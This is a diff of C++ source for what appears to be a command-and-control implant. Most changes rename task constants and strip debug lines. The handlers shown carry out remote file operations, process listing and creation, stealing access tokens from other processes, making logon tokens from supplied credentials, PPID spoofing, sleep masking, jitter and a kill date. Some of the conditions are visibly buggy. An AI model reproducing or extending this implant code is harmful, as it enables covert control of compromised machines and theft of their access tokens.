@@ -45,7 +45,7 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
 
     JobID = Self->Psr->Byte( Parser );
 
-    if ( JobID == KhGetTask ) {
+    if ( JobID == Enm::Task::GetTask ) {
         KhDbg("Processing job ID: %d", JobID);
         TaskQtt = Self->Psr->Int32( Parser );
         KhDbg("Task quantity received: %d", TaskQtt);
@@ -282,7 +282,7 @@ auto DECLFN Task::FileSystem(
     Self->Pkg->Byte( Package, SbCommandID );
     
     switch ( SbCommandID ) {
-        case FsList: {
+        case Enm::Fs::List: {
             WIN32_FIND_DATAA FindData     = { 0 };
             SYSTEMTIME       CreationTime = { 0 };
             SYSTEMTIME       AccessTime   = { 0 };
@@ -340,7 +340,7 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case FsCwd: {
+        case Enm::Fs::Cwd: {
             CHAR CurDir[MAX_PATH] = { 0 };
 
             Self->Krnl32.GetCurrentDirectoryA( sizeof( CurDir ), CurDir ); 
@@ -349,7 +349,7 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case FsMove: {
+        case Enm::Fs::Move: {
             PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
             PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );
 
@@ -357,7 +357,7 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case FsCopy: {
+        case Enm::Fs::Copy: {
             PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
             PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );
 
@@ -365,28 +365,28 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case FsMakeDir: {
+        case Enm::Fs::MakeDir: {
             PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );
 
             Success = Self->Krnl32.CreateDirectoryA( PathName, NULL );
             
             break;
         }
-        case FsDelete: {
+        case Enm::Fs::Delete: {
             PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );
 
             Success = Self->Krnl32.DeleteFileA( PathName );
 
             break;
         }
-        case FsChangeDir: {
+        case Enm::Fs::ChangeDir: {
             PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );
 
             Success = Self->Krnl32.SetCurrentDirectoryA( PathName );
 
             break;
         }
-        case FsRead: {
+        case Enm::Fs::Read: {
             PCHAR  PathName   = Self->Psr->Str( Parser, 0 );
             ULONG  FileSize   = 0;
             BYTE*  FileBuffer = { 0 };
@@ -408,7 +408,7 @@ auto DECLFN Task::FileSystem(
 
 _KH_END:
     if ( !Success ) { return KhGetError; }
-    if ( SbCommandID != FsList || SbCommandID != FsRead || SbCommandID != FsCwd ) {
+    if ( SbCommandID != Enm::Fs::List || SbCommandID != Enm::Fs::Read || SbCommandID != Enm::Fs::Cwd ) {
         Self->Pkg->Int32( Package, Success );
     }
 
@@ -430,13 +430,13 @@ auto DECLFN Task::Pivot(
     Self->Pkg->Byte( Package, SubCmd );    
 
     switch ( SubCmd ) {
-        case PvtList: {
+        case Enm::Pivot::List: {
 
         }
-        case PvtLink: {
+        case Enm::Pivot::Link: {
 
         }
-        case PvtUnlink: {
+        case Enm::Pivot::Unlink: {
 
         }
     }
@@ -1070,7 +1070,7 @@ auto DECLFN Task::Config(
         UINT8 ConfigID = Self->Psr->Int32( Parser );
         KhDbg( "config id: %d", ConfigID );
         switch ( ConfigID ) {
-            case CfgPpid: {
+            case Enm::Config::Ppid: {
                 ULONG ParentID = Self->Psr->Int32( Parser );
                 Self->Ps->Ctx.ParentID = ParentID;
 
@@ -1078,7 +1078,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case CfgSleep: {
+            case Enm::Config::Sleep: {
                 ULONG NewSleep = Self->Psr->Int32( Parser );
                 Self->Session.SleepTime = NewSleep * 1000;
 
@@ -1086,7 +1086,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case CfgJitter: {
+            case Enm::Config::Jitter: {
                 ULONG NewJitter = Self->Psr->Int32( Parser );
                 Self->Session.Jitter = NewJitter;
 
@@ -1094,7 +1094,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case CfgBlockDlls: {
+            case Enm::Config::BlockDlls: {
                 BOOL BlockDlls  = Self->Psr->Int32( Parser );
                 Self->Ps->Ctx.BlockDlls = BlockDlls;
                 
@@ -1102,7 +1102,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case CfgCurDir: {
+            case Enm::Config::CurDir: {
                 if ( Self->Ps->Ctx.CurrentDir ) {
                     Self->Hp->Free( Self->Ps->Ctx.CurrentDir );
                 }
@@ -1114,11 +1114,11 @@ auto DECLFN Task::Config(
 
                 Self->Ps->Ctx.CurrentDir = CurrentDir; break;
             }
-            case CfgMask: {
+            case Enm::Config::Mask: {
                 INT32 TechniqueID = Self->Psr->Int32( Parser );
                 if ( 
-                    TechniqueID != MaskTimer || 
-                    TechniqueID != MaskWait 
+                    TechniqueID != eMask::Timer || 
+                    TechniqueID != eMask::None 
                 ) {
                     KhDbg( "invalid mask id: %d", TechniqueID );
                     return KH_ERROR_INVALID_MASK_ID;
@@ -1128,16 +1128,16 @@ auto DECLFN Task::Config(
             
                 KhDbg( 
                     "mask technique id set to %d (%s)", Self->Mk->Ctx.TechniqueID, 
-                    Self->Mk->Ctx.TechniqueID == MaskTimer ? "timer" : 
-                    ( Self->Mk->Ctx.TechniqueID == MaskWait  ? "wait" : "unknown" ) 
+                    Self->Mk->Ctx.TechniqueID   == eMask::Timer ? "timer" : 
+                    ( Self->Mk->Ctx.TechniqueID == eMask::None  ? "wait" : "unknown" ) 
                 );
 
                 break;
             }
-            case CfgSpawn: {
+            case Enm::Config::Spawn: {
                 // PCHAR Spawn = Self->InjCtx.;
             }
-            case CfgKilldate: {
+            case Enm::Config::Killdate: {
                 SYSTEMTIME LocalTime { 0 };
 
                 INT16 Year  = (INT16)Self->Psr->Int32( Parser );
@@ -1158,9 +1158,6 @@ auto DECLFN Task::Token(
     PACKAGE* Package = Job->Pkg;
     PARSER*  Parser  = Job->Psr;
 
-    KhDbg("%p %d", Parser->Buffer, Parser->Length);
-    INT3BRK
-
     UINT8 SubID = Self->Psr->Int32( Parser );
 
     Self->Pkg->Byte( Package, SubID );
@@ -1168,7 +1165,7 @@ auto DECLFN Task::Token(
     KhDbg( "Sub Command ID: %d", SubID );
 
     switch ( SubID ) {
-        case TknGetUUID: {
+        case Enm::Token::GetUUID: {
             CHAR*  ProcUser    = nullptr;
             CHAR*  ThreadUser  = nullptr;
             HANDLE TokenHandle = nullptr;
@@ -1186,24 +1183,19 @@ auto DECLFN Task::Token(
 
             break;
         }
-        case TknSteal: {
+        case Enm::Token::Steal: {
             ULONG ProcessID = Self->Psr->Int32( Parser );
             BOOL  TokenUse  = Self->Psr->Int32( Parser );
             BOOL  Success   = FALSE;
 
             KhDbg("id: %d use: %s", ProcessID, TokenUse ? "true" : "false");
             TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );
-            KH_DBG_MSG
 
             if ( ! Token ) {
-                KH_DBG_MSG
                 Self->Pkg->Int32( Package, FALSE ); break;
-                KH_DBG_MSG
             }
 
             if ( TokenUse ) Self->Tkn->Use( Token->Handle );
-
-            KH_DBG_MSG
 
             Self->Pkg->Int32( Package, TRUE );
 
@@ -1221,33 +1213,35 @@ auto DECLFN Task::Token(
 
             break;
         }
-        case TknUse: {
+        case Enm::Token::Use: {
             HANDLE Token = (HANDLE)Self->Psr->Int32( Parser );
             Self->Pkg->Int32( Package, Self->Tkn->Use( Token ) );
             break;
         }
-        case TknRm: {
+        case Enm::Token::Rm: {
             ULONG TokenID = Self->Psr->Int32( Parser );
             Self->Pkg->Int32( Package, Self->Tkn->Rm( TokenID ) );  
             break;
         }
-        case TknRev2Self: {
+        case Enm::Token::Rev2Self: {
             Self->Pkg->Int32( Package, Self->Tkn->Rev2Self() ); break;
         }
-        case TknMake: {
+        case Enm::Token::Make: {
             CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
             CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
             CHAR*  Password    = Self->Psr->Str( Parser, 0 );
             HANDLE TokenHandle = nullptr;
 
-            LogonUserA( 
+            Self->Advapi32.LogonUserA( 
                 UserName, DomainName, Password, LOGON_NETCREDENTIALS_ONLY, LOGON32_PROVIDER_DEFAULT, &TokenHandle
             );
             if ( ! TokenHandle || TokenHandle != INVALID_HANDLE_VALUE ) {
                 break;
             }
 
-            Self->Tkn.
+            Self->Tkn->Add( TokenHandle, Self->Session.ProcessID );
+        }
+        case Enm::Token::GetPriv: {
         }
     }
 
@@ -1268,7 +1262,7 @@ auto DECLFN Task::Process(
     Self->Pkg->Byte( Package, SbCommandID );
 
     switch ( SbCommandID ) {
-        case SbPsCreate: {
+        case Enm::Ps::Create: {
             G_PACKAGE = Package;
 
             CHAR*               CommandLine = Self->Psr->Str( Parser, &TmpVal );
@@ -1289,7 +1283,7 @@ auto DECLFN Task::Process(
             
             break;
         }
-        case SbPsList: {
+        case Enm::Ps::List: {
             PVOID ValToFree = NULL;
             ULONG ReturnLen = 0;
             ULONG Status    = STATUS_SUCCESS;
@@ -1376,13 +1370,7 @@ auto DECLFN Task::Process(
                 Self->Pkg->Int32( Package, Isx64 );
                 
                 SysThreadInfo = SysProcInfo->Threads;
-            
-                // for (INT i = 0; i < SysProcInfo->NumberOfThreads; i++) {
-                    // Self->Pkg->Int32( Package, HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) );
-                    // Self->Pkg->Int64( Package, U_PTR( SysThreadInfo[i].StartAddress ) );
-                    // Self->Pkg->Int32( Package, SysThreadInfo[i].Priority );
-                    // Self->Pkg->Int32( Package, SysThreadInfo[i].ThreadState );
-                // }
+ 
                 if ( ProcessHandle && ProcessHandle != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ProcessHandle );
             
                 SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
@@ -1412,9 +1400,9 @@ auto DECLFN Task::Exit(
 ) -> ERROR_CODE {
     INT8 ExitType = Self->Psr->Byte( Job->Psr );
 
-    if ( ExitType == SbExitProcess ) {
+    if ( ExitType == Enm::Exit::Process ) {
         Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
-    } else if ( ExitType == SbExitThread ) {
+    } else if ( ExitType == Enm::Exit::Thread ) {
         Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
     }
 
